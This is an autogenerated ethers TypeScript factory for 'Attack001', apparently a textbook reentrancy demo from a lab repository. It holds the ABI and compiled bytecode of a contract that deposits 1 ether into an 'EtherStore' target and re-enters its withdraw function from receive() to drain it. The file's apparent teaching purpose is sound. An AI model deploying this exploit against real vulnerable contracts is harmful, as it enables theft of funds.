/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import type { Provider, TransactionRequest } from "@ethersproject/providers";
import type { PromiseOrValue } from "../../../common";
import type {
  Attack001,
  Attack001Interface,
} from "../../../hacks/ReEntrancy.sol/Attack001";

const _abi = [
  {
    inputs: [
      {
        internalType: "address",
        name: "_etherStoreAddress",
        type: "address",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "attack",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "etherStore",
    outputs: [
      {
        internalType: "contract EtherStore001",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "getBalance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    stateMutability: "payable",
    type: "receive",
  },
];

const _bytecode =
  "0x608060405234801561001057600080fd5b50604051610585380380610585833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b61046e806101176000396000f3fe6080604052600436106100385760003560e01c806312065fe01461010b5780639e5faafc14610136578063acd2e6e51461014057610106565b3661010657670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101045760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100eb57600080fd5b505af11580156100ff573d6000803e3d6000fd5b505050505b005b600080fd5b34801561011757600080fd5b5061012061016b565b60405161012d9190610306565b60405180910390f35b61013e610173565b005b34801561014c57600080fd5b506101556102c9565b60405161016291906103a0565b60405180910390f35b600047905090565b670de0b6b3a76400003410156101be576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101b590610418565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561022e57600080fd5b505af1158015610242573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102af57600080fd5b505af11580156102c3573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b610300816102ed565b82525050565b600060208201905061031b60008301846102f7565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061036661036161035c84610321565b610341565b610321565b9050919050565b60006103788261034b565b9050919050565b600061038a8261036d565b9050919050565b61039a8161037f565b82525050565b60006020820190506103b56000830184610391565b92915050565b600082825260208201905092915050565b7f4d696e696d756d20697320312065746865720000000000000000000000000000600082015250565b60006104026012836103bb565b915061040d826103cc565b602082019050919050565b60006020820190508181036000830152610431816103f5565b905091905056fea2646970667358221220ab3784416215e20c0e8f41ce81bf294d4ce9b566cfa0f9468c41d2a3bebccfd164736f6c634300080d0033";

type Attack001ConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: Attack001ConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class Attack001__factory extends ContractFactory {
  constructor(...args: Attack001ConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
  }

  override deploy(
    _etherStoreAddress: PromiseOrValue<string>,
    overrides?: Overrides & { from?: PromiseOrValue<string> }
  ): Promise<Attack001> {
    return super.deploy(
      _etherStoreAddress,
      overrides || {}
    ) as Promise<Attack001>;
  }
  override getDeployTransaction(
    _etherStoreAddress: PromiseOrValue<string>,
    overrides?: Overrides & { from?: PromiseOrValue<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(_etherStoreAddress, overrides || {});
  }
  override attach(address: string): Attack001 {
    return super.attach(address) as Attack001;
  }
  override connect(signer: Signer): Attack001__factory {
    return super.connect(signer) as Attack001__factory;
  }

  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): Attack001Interface {
    return new utils.Interface(_abi) as Attack001Interface;
  }
  static connect(
    address: string,
    signerOrProvider: Signer | Provider
  ): Attack001 {
    return new Contract(address, _abi, signerOrProvider) as Attack001;
  }
}
